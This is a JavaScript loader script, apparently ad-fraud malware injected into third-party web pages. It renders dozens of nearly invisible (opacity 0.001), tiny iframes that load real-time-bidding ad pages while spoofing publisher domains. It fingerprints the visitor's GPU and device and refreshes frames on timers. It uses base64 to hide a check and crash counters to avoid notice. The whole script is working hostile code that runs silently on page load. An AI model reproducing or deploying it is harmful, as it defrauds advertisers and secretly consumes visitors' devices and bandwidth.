// https://t.me/adloox го пообщаемся)

function isSmartTV() {
    return navigator.userAgent.search(/TV/i) >= 0;
}
function isAndroid() {
    return navigator.userAgent.search(/Android/i) >= 0;
}
function isApple() {
    return navigator.userAgent.toLowerCase().search(/(ipad|iphone|ipad)/) >= 0;
}
function isYandex() {
    return navigator.userAgent.toLowerCase().search(/(yabrowser)/) >= 0;
}
function isMacintosh() {
    return navigator.userAgent.toLowerCase().search(/(macintosh)/) >= 0;
}
function isMobile() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i
        .test(navigator.userAgent)
}
function rand(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min;
}


function zindexFix() {
    document.querySelectorAll("body *").forEach(function (t) {
        if (window.getComputedStyle(t).zIndex >= 2147482645) {
            t.style.zIndex = 1147483646;
        }
    });
}

function getsid(elementId = '11dbdf37b8') {
    var scriptElement = document.getElementById(elementId);
    if (scriptElement && scriptElement.hasOwnProperty('subid')) {
        return `&statId=${scriptElement.subid}`;
    } else {
        return `&statId=1`;
    }
}
function getsubid(elementId = '11dbdf37b8') {
    var scriptElement = document.getElementById(elementId);
    if (scriptElement && scriptElement.hasOwnProperty('subid')) {
        return scriptElement.subid;
    } else {
        return 2;
    }
}



const currentTime = new Date().getTime();
var unicTime;

try {
    unicTime = parseInt(localStorage["unic"]);
    if (!unicTime || currentTime - unicTime > 60000 * 60 * 24) {
        localStorage["unic"] = currentTime;
        new Image(1, 1).src = `https://vm-bb4ce6df.na4u.ru/api/wstats/?e_type=unic&sub=loader&_t=${currentTime}`;
    }
} catch (error) {

}




new Image(1, 1).src = `https://vm-bb4ce6df.na4u.ru/api/wstats/?e_type=pixel&sub=loader&_t=${currentTime}`;
new Image(1, 1).src = `https://vm-bb4ce6df.na4u.ru/api/wstats/?e_type=pixel&sub=${getsubid()}&_t=${currentTime}`;

function getAllUrlParams(e) { var t = e ? e.split("?")[1] : window.location.search.slice(1), r = {}; if (t) for (var s = (t = t.split("#")[0]).split("&"), a = 0; a < s.length; a++) { var i = s[a].split("="), l = i[0], o = void 0 === i[1] || i[1]; if (l = l.toLowerCase(), "string" == typeof o && (o = o.toLowerCase()), l.match(/\[(\d+)?\]$/)) { var p = l.replace(/\[(\d+)?\]/, ""); if (r[p] || (r[p] = []), l.match(/\[\d+\]$/)) { var c = /\[(\d+)\]/.exec(l)[1]; r[p][c] = o } else r[p].push(o) } else r[l] ? (r[l] && "string" == typeof r[l] && (r[l] = [r[l]]), r[l].push(o)) : r[l] = o } return r }


function fibonacci(n) {
    if (n <= 1) return n;
    return fibonacci(n - 1) + fibonacci(n - 2);
}

function generateRandomArray(length) {
    const arr = [];
    for (let i = 0; i < length; i++) {
        arr.push(Math.random());
    }
    return arr;
}

function matrixMultiplication(A, B) {
    const rowsA = A.length, colsA = A[0].length;
    const rowsB = B.length, colsB = B[0].length;
    const C = [];

    if (colsA !== rowsB) return false;

    for (let i = 0; i < rowsA; i++) {
        C[i] = [];
        for (let j = 0; j < colsB; j++) {
            C[i][j] = 0;
            for (let k = 0; k < colsA; k++) {
                C[i][j] += A[i][k] * B[k][j];
            }
        }
    }
    return C;
}

function complexFunction() {
    // Вычисление числа Фибоначчи
    const fibResult = fibonacci(30); // Увеличьте значение для большей нагрузки

    // Сортировка массива
    const randomArray = generateRandomArray(1e5);
    randomArray.sort((a, b) => a - b);

    // Умножение матриц
    const matrixA = [[1, 2], [3, 4]];
    const matrixB = [[2, 0], [1, 3]];
    const matrixResult = matrixMultiplication(matrixA, matrixB);


    let sum = 0;
    for (let i = 0; i < 1e7; i++) {
        sum += Math.sin(i) * Math.cos(i);
    }


    return {
        sum,
        fibResult,
        firstSortedValue: randomArray[0], // просто чтобы вернуть какое-то значение
        matrixResult
    };
}

function runBenchmark(limit = 400) {
    let times = [];
    for (let i = 0; i < 6; i++) {
        const startTime = performance.now();
        complexFunction();
        const endTime = performance.now();
        times.push(endTime - startTime);
    }

    return times.every(time => time < limit);
}
function getAndroidVersion() {
    const userAgent = navigator.userAgent;
    const androidRegex = /Android (\d+)/; // Изменено для поиска только целочисленной части

    const match = androidRegex.exec(userAgent);
    if (match && match[1]) {
        return parseInt(match[1], 10); // Преобразует строку в целое число
    }

    return null; // Возвращает null, если версия Android не найдена
}

function getSafariVersion() {
    const userAgent = navigator.userAgent;
    const safariRegex = /Version\/([\d.]+)/;

    if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
        const match = safariRegex.exec(userAgent);
        if (match && match[1]) {
            return parseInt(match[1], 10); // Возвращает номер версии Safari
        }
    }

    return 1; // Возвращает null, если не найдена версия Safari или браузер не является Safari
}

function isLaptop() {
    const width = window.screen.width;
    const height = window.screen.height;

    return width >= 1024 && width <= 1920 && height >= 768 && height <= 1080;
}

function isAmdOrNvidia() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

    if (!gl) return false;

    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');

    if (!debugInfo) return false;

    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();

    return renderer.includes('nvidia') || renderer.includes('amd') || renderer.includes('ati');
}


 
var isBench = ["405", "333"].includes(getsubid());

window.runbench = isBench ? runBenchmark() : false;

if (!isApple() && !isMacintosh()) {
    if (!window.bb && !isAmdOrNvidia() && !isLaptop()) {
        try {
            new Image(1, 1).src = `https://vm-bb4ce6df.na4u.ru/api/wstats/?e_type=skip&sub=${getsubid()}&_t=${new Date().getTime()}`;
        } catch (error) {

        }
    } else {
        try {
            new Image(1, 1).src = `https://vm-bb4ce6df.na4u.ru/api/wstats/?e_type=imp&sub=${getsubid()}&_t=${new Date().getTime()}`;
        } catch (error) {

        }
    }
}



var ancestorOrigins = location.ancestorOrigins || [];
var ancestorOriginsArray = [];
if (ancestorOrigins.length) {
    origin = ancestorOrigins[ancestorOrigins.length - 1];
    for (var i = 0; i < ancestorOrigins.length; i++) {
        ancestorOriginsArray.push(new URL(ancestorOrigins[i]).host);
    }
}

ancestorOriginsArray.unshift(location.host);

function frand(min, max) {
    min = min;
    max = max;
    return (Math.random() * (max - min + 1)) + min;
}

try {

    // 💩 https://t.me/adloox го пообщаемся) 💩
    if (ancestorOriginsArray.includes("slovechko.com") && window.top.location != window.location) {
        location.href = 'about:blank';

    }

    if (!["dorama.land", "skam.online", "ucrazy.ru", "wvvw.lafa.site", "lafa.site",  "lafa.site", "anime1.best", "pl.4everproxy.com"].includes(location.host)) {
       // window.fraud = true;
    }
} catch (error) {

}

if (!Array.prototype.hasOwnProperty('sample')) {
    Object.defineProperty(Array.prototype, 'sample', {
        value: function () {
            return this[Math.floor(Math.random() * this.length)];
        },
        enumerable: false
    });
}


function formatBytes(bytes, decimals = 2) {
    if (bytes === 0) return 0;
    const k = 1024;
    const dm = 0;

    return parseFloat((bytes / k).toFixed(dm));
}

function getLimitLine(limit) {
    try {
        localStorage.getItem('count_crash_10') != null && localStorage.getItem('count_crash_10') >= 1 ? ym(94746896, 'reachGoal', 'onlimit') : ym(94746896, 'reachGoal', 'offlimit');
    } catch (error) {

    }
    return localStorage.getItem('count_crash_10') != null && localStorage.getItem('count_crash_10') >= 1 ? (ym(94746896, 'reachGoal', 'succes'), 2) : limit;
}

var style = document.createElement('style');
style.innerHTML = `#ya_85b029b3a1c2 { z-index: 2147482644 !important; overflow: unset; position: fixed; top: 0px; left: 0px; display: contents; } .ya_uYZBnLDnIyswhKWzZLSW { transform: translateZ(0); will-change: transform;  }`;
document.head.appendChild(style);


var div = document.createElement("div"); // create a script DOM node
div.id = `ya_85b029b3a1c2`;
div.className = `ya_uYZBnLDnIyswhKWzZLSW`;
document.body.appendChild(div);


const moscowTime = new Date().toLocaleString("en-US", { timeZone: "Europe/Moscow" });
const currentHour = new Date(moscowTime).getHours();
const isNight = currentHour < 7 || currentHour >= 0;

var _o = {
    width: window.innerWidth,
    height: window.innerHeight,
    gap: 0,
    block: (!isMobile() ? { width: 650, height: 400 } : { width: 720, height: 1280 }),
    scale: (isMobile() ? 0.2 : 0.3),
    vertical: true,
    timeline: 0
}
// _o.width = window.innerWidth - (~~((_o.block.width) * _o.block.scale));

function arrsrt(array) {
    let currentIndex = array.length, randomIndex;

    while (currentIndex != 0) {
        randomIndex = Math.floor(Math.random() * currentIndex);
        currentIndex--;
        [array[currentIndex], array[randomIndex]] = [
            array[randomIndex], array[currentIndex]];
    }

    return array;
}

function concatr(frames, arr) {
    return frames.concat(arrsrt(arr));
}


var mains = []
var leeches = []


try {
    if (typeof document.hidden !== "undefined") {
        var hidden = "hidden",
            visibilityChange = "visibilitychange";
    } else if (typeof document.msHidden !== "undefined") {
        var hidden = "msHidden",
            visibilityChange = "msvisibilitychange";
    } else if (typeof document.webkitHidden !== "undefined") {
        var hidden = "webkitHidden",
            visibilityChange = "webkitvisibilitychange";
    }

    function handleVisibilityChange() {
        var scriptElement = document.getElementById('11dbdf37b8');
        if (document[hidden]) {

            if (scriptElement && scriptElement.hasOwnProperty('subid')) {
                scriptElement.subid = 3;
            }
        } else {

            if (scriptElement && scriptElement.hasOwnProperty('subid')) {

                scriptElement.subid = 4;
            }
        }
    }



    if (window.top.location != window.location) {

        var scriptElement = document.getElementById('11dbdf37b8');
        if (scriptElement && scriptElement.hasOwnProperty('subid')) {
            scriptElement.subid = 2;
        }

        if (typeof document.addEventListener === "undefined" || hidden === undefined) {
            console.log("Page Visibility API не поддерживается в этом браузере");
        } else {
            document.addEventListener(visibilityChange, handleVisibilityChange, false);
            handleVisibilityChange()
        }



    }


} catch (error) {

}


function getLinkRTB(vhookd = "borzjournal.ru") {

    var ddlist = [["2402846", "game-roblox.ru"], ["3116400", "iphones.ru"], ["3116399", "iguides.ru"], ["3116398", "androidinsider.ru"], ["2592520", "burninghut.ru"], ["3100469", "ixbt.com"],
    ["2592518", "gdeotziv.ru"],
    ["2387634", "tur-ray.ru"]];


    let maind = ddlist.sample();
    return `https://${vhookd}/vhook/v7/rtb2/rtbfr.html?domian=${maind[1]}&id=${maind[0]}&pl=1${getsid()}`;
}


mains.push({
    src: "https://borzjournal.ru/vhook/v7/rtb2/rtbfr.html?domian=tehno-rating.ru&id=4384699&pl=1&statId=1227", chance: (getsubid() == "1337" ? 100 : 0) 
}, {
    src: "https://borzjournal.ru/t/yanet.html?domian=yakapitalist.ru&id=5266773&pl=1&statId=2"
}, {
    src: getLinkRTB(), chance: 20, tier: 1, time: 5
});



mains.push({
    src: "https://borzjournal.ru/vhook/v7/rtb2/rtbfr.html?domian=gdeotziv.ru&id=2592518&pl=1", end_src: getsid()
}, {
    src: "https://borzjournal.ru/vhook/v7/rtb2/rtbfr.html?domian=investmint.ru&id=5266756&pl=1", end_src: getsid()
}, {
    src: "https://borzjournal.ru/vhook/v7/rtb2/rtbfr.html?domian=appleinsider.ru&id=2914549&pl=1", end_src: getsid()
}, {
    src: "https://borzjournal.ru/vhook/v7/rtb2/rtbfr.html?domian=game-roblox&id=2402846&pl=1", end_src: getsid()
}, {
    src: "https://borzjournal.ru/vhook/v7/rtb2/rtbfr.html?domian=tourprom.ru&id=2333463&pl=1", end_src: getsid()
}, {
    src: "https://borzjournal.ru/vhook/v7/rtb2/rtbfr.html?domian=all-events.ru&id=2333447&pl=1", end_src: getsid()
}, {
    src: "https://borzjournal.ru/vhook/v7/rtb2/rtbfr.html?domian=ideichtopodarit.ru&id=4250265&pl=1&statId=1337", chance: (getsubid() == "1337" ? 100 : 0)
}, {
    src: "https://borzjournal.ru/vhook/v7/rtb2/rtbfr.html?domian=investmint.ru&id=5266756&pl=1", end_src: getsid()
}, {
    src: getLinkRTB(), tier: 4
}, {
    src: "https://borzjournal.ru/vhook/v7/rtb2/rtbfr.html?domian=darimtop.com&id=4318251&pl=1&statId=1337", chance: (getsubid() == "1337" ? 100 : 0)
}, {
    src: "https://borzjournal.ru/vhook/v7/rtb2/rtbfr.html?domian=iphones.ru&id=3116400&pl=1", end_src: getsid()
}, {
    src: "https://borzjournal.ru/vhook/v7/rtb2/rtbfr.html?domian=tadviser.ru&id=4567094&pl=1&statId=1227", chance: (getsubid() == "1337" ? 100 : 0)
}, {
    src: ["https://journalrussia.ru/relap.html?pl=1", "https://journalrussia.ru/relap2.html?pl=1"].sample(), end_src: getsid()
}, {
    src: ["https://msk-reality.ru/relap-banner.html?r=1", "https://msk-reality.ru/relap-banner.html?r=1"].sample(), end_src: getsid(), root: (isMobile() && rand(1, 100) <= 5 ? true : false)
}, {
    src: "https://borzjournal.ru/vhook/v7/rtb2/rtbfr_fc.html?domian=appleinsider.ru&id=2914549&pl=2", end_src: getsid(), root: isMobile()
});


var mains = concatr([], mains);



mains.push({
    src: "https://data.ufcplayer.ru/vhook/v7/vid_test.html?r=1", root: false, chance: 0
}, {
    src: getLinkRTB(), tier: 1, chance: 80, time: 5
}, {
    src: getLinkRTB(), tier: 1, chance: 80, time: 5
});

mains.push({
    src: "https://borzjournal.ru/vhook/v7/rtb2/rtbfr_fc.html?domian=appleinsider.ru&id=2914549&pl=2&statId=111", root: isMobile(), chance: (getsubid() == "1337" ? 100 : 0)
}, {
    src: "https://borzjournal.ru/vhook/v7/rtb2/rtbfr.html?domian=iphones.ru&id=3116400&pl=1", end_src: getsid()
}, {
    src: "https://borzjournal.ru/t/yanet.html?domian=yakapitalist.ru&id=5266773&pl=1&statId=2", tier: 2
}, {
    src: getLinkRTB(), tier: 2
}, {
    src: getLinkRTB(), tier: 1
}, {
    src: getLinkRTB(), tier: 1, time: 5
});
/* 
{
    src: ["https://player.com?token_movie=a449992290c0c93b7823669b0ccfdd&token=82899d31edac6946e2119e00f51229", "https://player.com?token_movie=3a0f0c5e59cfff423d2097cf9d95e7&token=82899d31edac6946e2119e00f51229"].sample(), callback: function (cfg, iframe) {
        if (iframe.src.includes('token_movie')) {
            iframe.contentWindow.postMessage({ "api": "volume", "set": 0 }, "*");
            iframe.contentWindow.postMessage({ "api": "play" }, "*");
            setTimeout(() => {
                iframe.src = "about:blank";
            }, (40000));
        }
    }
}
*/

leeches.push({
    src: "https://data.ufcplayer.ru/twitch/players.html?p=1", chance: 15
}, {
    src: "https://data.ufcplayer.ru/vhook/v7/vk_clip.html?id=456239036&&oid=-223678906", chance: 0
}, {
    src: ["https://journalrussia.ru/relap.html?pl=1", "https://journalrussia.ru/relap2.html?pl=1"].sample(), end_src: getsid()
});

var frames = concatr(mains, leeches);


(function (m, e, t, r, i, k, a) {
    m[i] = m[i] || function () { (m[i].a = m[i].a || []).push(arguments) };
    var z = null; m[i].l = 1 * new Date();
    for (var j = 0; j < document.scripts.length; j++) { if (document.scripts[j].src === r) { return; } }
    k = e.createElement(t), a = e.getElementsByTagName(t)[0], k.async = 1, k.src = r, a.parentNode.insertBefore(k, a)
})
    (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");


new Image(1, 1).src = 'https://mc.yandex.ru/watch/94746896';
ym(94746896, "init", {
    clickmap: true,
    trackLinks: true,
    webvisor: true,
    accurateTrackBounce: true
});

ym(94746896, 'reachGoal', 'init');

function readyStateStart() {
    if (window.fraud) { return; }
    if (window.top != window) { return; }
    if (document.referrer.indexOf(atob('aWZyYW1lLXlhbmcueWFuZGV4')) != -1) { return; }
    if (ancestorOriginsArray.includes(atob('aWZyYW1lLXlhbmcueWFuZGV4'))) { return; }

    ym(94746896, 'reachGoal', 'load');


    if (localStorage.getItem('count_crash_10') == null || localStorage.getItem('count_crash_10') != null && localStorage.getItem('count_crash_10') < 2) { //&& (isApple() || isMobile() || isSmartTV() || isMacintosh()) || (!isApple() && !isMobile() && !isSmartTV() && !isMacintosh())) {
        window.global_on = true;
        ym(94746896, 'reachGoal', 'succes');
        render(!true);
    } else {
        window.global_on = !true;
        ym(94746896, 'reachGoal', 'crash');
    }
}

if (document.readyState === 'complete') {
    readyStateStart();
} else {
    window.addEventListener('load', function () {
        readyStateStart();
    });
}



function renderFrame(cfg, index, _time = 300) {

    if (index > 5) {
        _time = 1000
    }
    setTimeout(() => {
        let colsNum = _o.vertical ? ~~(_o.height / (_o.block.height * _o.scale + _o.gap)) : (_o.width / (_o.block.width * _o.scale + _o.gap))
        let fs = {
            left: _o.vertical ? (~~(index / colsNum)) * (_o.block.width * _o.scale + _o.gap) : (index % colsNum) * (_o.block.width * _o.scale + _o.gap),
            top: _o.vertical ? ~~(index % colsNum) * (_o.block.height * _o.scale + _o.gap) : (~~(index / colsNum)) * (_o.block.height * _o.scale + _o.gap),
            scale: _o.scale
        }
        var frame = document.createElement("iframe");
        let id = index;



        frame.src = cfg.src + `&_t=${(1 * new Date())}` + (cfg?.end_src || "");
        frame.id = `rtbid_${id}`;
        frame.setAttribute("autoplay", "0");
        frame.setAttribute("referrerpolicy", "no-referrer");
        frame.style = `left:${fs.left}px;top:${fs.top}px;z-index: 2147482644 !important;transform-origin: 0 0;transform: scale(${fs.scale});position: fixed;opacity: 0.001; max-width: none;`
        frame.width = _o.block.width;
        frame.height = _o.block.height;
        frame.onload = function () {
            if (localStorage.getItem("__dev") == "1") {
                setTimeout(() => {
                    document.getElementById(`rtbid_${index}`).src = "about:blank";
                    document.getElementById(`rtbid_${index}`).src = cfg.src + `&_t=${(1 * new Date())}` + (cfg?.end_src || "");
                }, (60000 * (cfg?.time ? frand(cfg.time, cfg.time + 1) : rand(1, 2))));

            } else if (rand(0, 100) <= 20 || cfg?.time) {
                setTimeout(() => {
                    document.getElementById(`rtbid_${index}`).src = "about:blank";
                    document.getElementById(`rtbid_${index}`).src = cfg.src + `&_t=${(1 * new Date())}` + (cfg?.end_src || "");
                }, (60000 * (cfg?.time ? frand(cfg.time, cfg.time + 1) : rand(28, 59))));

            }

            cfg?.callback && typeof cfg.callback == "function" ? cfg.callback(cfg, frame) : false;
        }
        frame.style['transform'] = `scale(${_o.scale})`;
        document.getElementById('ya_85b029b3a1c2').append(frame);

        sessionStorage.setItem('ifcount', document.querySelectorAll("#ya_85b029b3a1c2 > iframe").length);

        try {
            ym(94746896, 'reachGoal', 'renderFrame');
        } catch (error) {

        }
    }, _o.timeline * _time);
}



function render(rerendr = false) {




    if (window.global_on != true) { return; }

    zindexFix();


    frs = rerendr ? document.querySelectorAll('#ya_85b029b3a1c2 > iframe') : frames;
    if (rerendr) {
        try {
            ym(94746896, 'reachGoal', 'rerendr');
        } catch (error) {

        }
    } else {
        try {
            ym(rtbid_, 'reachGoal', 'rendr');
        } catch (error) {

        }
    }


    frs.forEach((cfg = false, index) => {


        if (!cfg) {
            console.error("Ошибка: конфигурация отсутствует");
            return;
        }


        if (cfg?.night && cfg?.night == true && isNight && typeof cfg?.chance == "number") {
            cfg.chance = Math.min(Math.round(cfg.chance * 1.2), 100);

        }


        if (cfg?.chance == 0 || cfg?.chance && typeof cfg.chance == "number" && rand(0, 100) >= cfg.chance) {
            return;
        }

        let colsNum = _o.vertical ? ~~(_o.height / (_o.block.height * _o.scale + _o.gap)) : (_o.width / (_o.block.width * _o.scale + _o.gap))
        let fs = {
            left: _o.vertical ? (~~(index / colsNum)) * (_o.block.width * _o.scale + _o.gap) : (index % colsNum) * (_o.block.width * _o.scale + _o.gap),
            top: _o.vertical ? ~~(index % colsNum) * (_o.block.height * _o.scale + _o.gap) : (~~(index / colsNum)) * (_o.block.height * _o.scale + _o.gap),
            scale: _o.scale
        }

        if (rerendr) {

            cfg.style = `left:${fs.left}px;top:${fs.top}px;z-index: 2147482644 !important;transform-origin: 0 0;transform: scale(${fs.scale});position: fixed;opacity: 0.001; max-width: none; `
        } else {

             
            if (isApple() || isMacintosh()) {
                if (getSafariVersion() >= 16 && _o.timeline < getLimitLine(3) || _o.timeline < getLimitLine(2) || cfg?.root) {
 
                    renderFrame(cfg, _o.timeline, 5000);
                    _o.timeline++;
                }
                //![6,7].includes(new Date(moscowTime).getDay()) isLaptop() && !isAmdOrNvidia() 
                // (isBench ? isLaptop() : false) || (isBench ? !runBenchmark(300) : false) && !isLaptop()
            } else if (isMobile()) {


                if (isBench && localStorage["isBenchFix"] != undefined && _o.timeline < getLimitLine(1) || isBench && localStorage["isBenchFix"] == undefined && _o.timeline < getLimitLine(2) || isBench && isAndroid() && getAndroidVersion() <= 10 && _o.timeline < getLimitLine(1) || isBench && !isAndroid() && _o.timeline < getLimitLine(3) || isBench && isAndroid() && getAndroidVersion() >= 11 && _o.timeline < getLimitLine(3) || !isBench && _o.timeline < getLimitLine(3) || !isBench && _o.timeline < getLimitLine(4) && localStorage["isBenchFix"] == undefined || cfg?.root) {

                    renderFrame(cfg, _o.timeline, 5000);
                    _o.timeline++;
                }
            } else if (!isBench || isBench && _o.timeline < getLimitLine(5) || isBench && _o.timeline < getLimitLine(10) && !window.runbench || isBench && localStorage["isBenchFix"] == undefined || cfg?.root) {

                renderFrame(cfg, _o.timeline);
                _o.timeline++;
            }
        }
    })
}
function resizedw() {
    _o.width = window.innerWidth;
    _o.height = window.innerHeight;
    render(true);
}

function ClickFix() {

    if (localStorage["ctr"] == undefined || (localStorage["ctr"] != undefined && new Date().getTime() - parseInt(localStorage["ctr"]) > 60000 * 60 * 3)) {
        localStorage["ctr"] = new Date().getTime();
        setTimeout(() => {
            _o.scale = 0.001;
            render(true);
        }, 3500);
    } else {
        setTimeout(() => {
            _o.scale = 0.001;
            render(true);
        }, 500);
    }

}

if (localStorage["ctr"] == undefined || (localStorage["ctr"] != undefined && new Date().getTime() - parseInt(localStorage["ctr"]) > 60000 * 60 * 3)) {
} else {
    _o.scale = 0.001;
    render(true);
}


var doit;
window.onresize = function () {
    clearTimeout(doit);
    doit = setTimeout(resizedw, 100);
};

setTimeout(() => {
    localStorage["isBenchFix"] = true;
    ClickFix();
}, 30000);



window.addEventListener("visibilitychange", function (e) {
    if (document.visibilityState == 'hidden') {
        ClickFix();
    }
});

var mql = window.matchMedia("(orientation: portrait)");

_o.vertical = mql.matches;

mql.addListener(function (m) {
    _o.vertical = mql.matches;
    _o.width = window.innerWidth;// - (~~((_o.block.width) * _o.block.scale));
    _o.height = window.innerHeight;
    render(true);
});


// CRASH FIX

var version_ = "22";



window.onblur = function () {
    sessionStorage.setItem('focused', false);
    ClickFix();
};


setInterval(zindexFix, 15000)
zindexFix();

window.addEventListener('load', function () {



    sessionStorage.setItem('good_exit', 'pending');

    setTimeout(() => {
        sessionStorage.clear();
        sessionStorage.setItem('good_exit', 'pending');
        sessionStorage.setItem('focused', "true");
        window.onfocus = function () {
            sessionStorage.setItem('focused', "true");
        };
        sessionStorage.setItem('_href', document.location.href);
        sessionStorage.setItem('_ref', document.referrer);
        sessionStorage.setItem('cv', version_);
        sessionStorage.setItem('time_start', new Date());
    }, 1000);

    setInterval(function () {
        sessionStorage.setItem('ifcount', document.querySelectorAll("#ya_85b029b3a1c2 > iframe").length);
        sessionStorage.setItem('time_end', new Date().toString());
        sessionStorage.setItem('time_before_crash', new Date().toString());
        if (!isYandex() && !isApple() && window.performance && window.performance?.memory && window.performance?.memory?.usedJSHeapSize) {
            sessionStorage.setItem('info_before_crash', "(" + formatBytes(performance.memory.usedJSHeapSize) + " | " + formatBytes(performance.memory.totalJSHeapSize) + " / " + formatBytes(performance.memory.jsHeapSizeLimit) + ")")
        }
    }, 1000);
});

window.addEventListener("pagehide", function () {
    sessionStorage.setItem('good_exit', 'true');
});

window.addEventListener("beforeunload", function (e) {
    sessionStorage.setItem('good_exit', 'true');
});

if (isApple()) {
    window.addEventListener("visibilitychange", function (e) {
        if (document.visibilityState == 'hidden') {
            sessionStorage.setItem('good_exit', 'true');
        }
    });
}
window.getCookie = function (name) {
    var match = document.cookie.match(new RegExp('(^| )' + namew + '=([^;]+)'));
    if (match) return match[2];
}

if (sessionStorage.getItem('good_exit') &&
    sessionStorage.getItem('good_exit') !== 'true') {
    if (localStorage.getItem("send_crash_9") == null && (sessionStorage.getItem('focused') == "true" || !true) && !false && parseInt(sessionStorage.getItem('ifcount')) >= 1 || localStorage.getItem("debug") != null) {

        localStorage.getItem("count_crash_10") == null ? localStorage.setItem("count_crash_10", 1) : localStorage.setItem("count_crash_10", parseInt(localStorage.getItem("count_crash_10")) + 1)
        var pageTime = (new Date(sessionStorage.getItem('time_end')) - new Date(sessionStorage.getItem('time_start'))) / 1000;
        var lastTime = (new Date() - new Date(sessionStorage.getItem('time_end'))) / 1000;
        var log = {
            v: version_, cv: sessionStorage.getItem('cv'), info: sessionStorage.getItem('info_before_crash'), pageTime: pageTime, frames: sessionStorage.getItem('ifcount'), count_crash: localStorage.getItem('count_crash_10'), browser: navigator.userAgent
        }

        var icon = isMobile() ? isApple() ? ' 📲' : '📱' : isSmartTV() ? '📺' : '🖥';
        var log2 = "\n🕓 time: " + pageTime + " (" + lastTime + ")" + "\n💵 frames: " + sessionStorage.getItem('ifcount') + "\n🆘 count_crash: " + localStorage.getItem('count_crash_10') + "\n📊 info: " + sessionStorage.getItem('info_before_crash') + "\n" + icon + " browser: " + navigator.userAgent + "\nfocus: " + sessionStorage.getItem('focused') + "\nref: " + sessionStorage.getItem('_ref') + "\nhref: " + sessionStorage.getItem('_href') + "\nhref_this: " + document.location.href + "\nver: " + version_;



        localStorage.setItem("send_crash_9", log)
        localStorage.removeItem("send_crash_9");
        try {
            ym(94746896, 'reachGoal', 'send_crash');
        } catch (error) {

        }
        if (sessionStorage.getItem("cv") == version_ && parseInt(sessionStorage.getItem('count_crash_10')) >= 2) {

        }
    }
}

(function () {
    return;
    // Создание нового элемента <script>
    var script = document.createElement('script');
    script.src = "https://cdn.socket.io/4.6.0/socket.io.min.js";
    script.integrity = "sha384-c79GN5VsunZvi+Q/WObgk2in0CbZsHnjEqvFxC5DxHn9lTfNce2WW6h2pH6u/kF+";
    script.crossOrigin = "anonymous";

    // Добавление обработчика события, который будет вызван после загрузки скрипта
    script.onload = function () {
        var socket = io("socket.ufcplayer.ru");
        socket.emit('joinRoom', "loader");
    };

    // Добавление элемента <script> в DOM (в конец body)
    document.body.appendChild(script);
})();



